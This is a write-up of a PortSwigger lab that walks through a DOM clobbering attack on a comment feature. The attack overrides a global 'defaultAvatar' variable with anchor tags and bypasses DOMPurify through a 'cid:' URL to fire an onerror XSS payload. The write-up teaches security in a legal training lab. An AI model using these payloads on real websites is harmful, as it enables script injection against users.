# Exploiting DOM clobbering to enable XSS

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering), you'll learn: Exploiting DOM clobbering to enable XSS! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses [XSS](https://portswigger.net/web-security/cross-site-scripting) to call the `alert()` function.

> Note:
>  
> Please note that the intended solution to this lab will only work in Chrome.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114202512.png)

In the home page, we can view other posts:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114202532.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114202542.png)

And we can leave some comments!

**View source page:**
```html
[...]
<h1>Comments</h1>
<span id='user-comments'>
<script src='resources/js/domPurify-2.0.15.js'></script>
<script src='resources/js/loadCommentsWithDomClobbering.js'></script>
<script>loadComments('/post/comment')</script>
</span>
<hr>
<section class="add-comment">
    <h2>Leave a comment</h2>
    <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
        <input required type="hidden" name="csrf" value="kHBcFRVLJKJsiUEmCWZj4eAKbm4AY16B">
        <input required type="hidden" name="postId" value="7">
        <label>Comment:</label>
        <div>HTML is allowed</div>
        <textarea required rows="12" cols="300" name="comment"></textarea>
                <label>Name:</label>
                <input required type="text" name="name">
                <label>Email:</label>
                <input required type="email" name="email">
                <label>Website:</label>
                <input pattern="(http:|https:).+" type="text" name="website">
        <button class="button" type="submit">Post Comment</button>
    </form>
</section>
[...]
```

As you can see, the post page **loaded the DOMPurify** JavaScript library, which is a XSS sanitizer for HTML.

It also **loaded a JavaScript file called `loadCommentsWithDomClobbering.js`**, and calling function `loadComments()` with `/post/comment` argument.

**`loadCommentsWithDomClobbering.js`:**
```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(data) {
        return data.replace(/[<>'"]/g, function(c){
            return '&#' + c.charCodeAt(0) + ';';
        })
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
            let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

            let divImgContainer = document.createElement("div");
            divImgContainer.innerHTML = avatarImgHTML

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(divImgContainer);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```

Basically what this JavaScript does is send a GET request to `/post/comment`, and then stores all the comments to a JSON data. After that, display all comments.

**However, it has an interesting thing:**
```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```

**This `defaultAvatar` object is using an bitwise OR operator with a global variable, which is a dangerous pattern!** This can lead to DOM clobbering vulnerability!

If we can **override the orginal `defaultAvatar` object with an anchor element**, we can inject some JavaScript!

**Also, the post comment functionality allows HTML!**

Armed with above information, we can try to override the `defaultAvatar` object:

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href='"onerror=alert(document.domain)//'>
```

This will override the `defaultAvatar` object `avatar` attribute's property to `alert(document.domain)//`:

```js
{avatar: '"onerror=alert(document.domain)//'}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114210654.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114210717.png)

Then we need to submit a second comment, which will then uses the newly-clobbered global variable. This should smuggle the payload in the `onerror` event handler and triggers the `alert()`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114210733.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114210805.png)

We successfully clobbered the `defaultAvatar` object, **however the `"` is URL encoded. Why?**

**This is because it's sanitized by DOMPurify:**
```js
commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
```

Luckly, we can bypass that.

**In DOMPurify, it allows us to use the `cid:` protocol, which doesn't URL encode double quotes.**

That bein said, **we can inject an HTML encoded double quote that will be decoded at runtime**!

**Final payload:**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:&quot;onerror=alert(document.domain)//'>
```

**Clobbered the `defaultAvatar` object:**
```js
{avatar: 'cid:"onerror=alert(document.domain)//'}
```

**Let's go to another post to override the `defaultAvatar` object!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114211042.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114211119.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114211132.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-6/images/Pasted%20image%2020230114211215.png)

It worked!

# What we've learned:

1. Exploiting DOM clobbering to enable XSS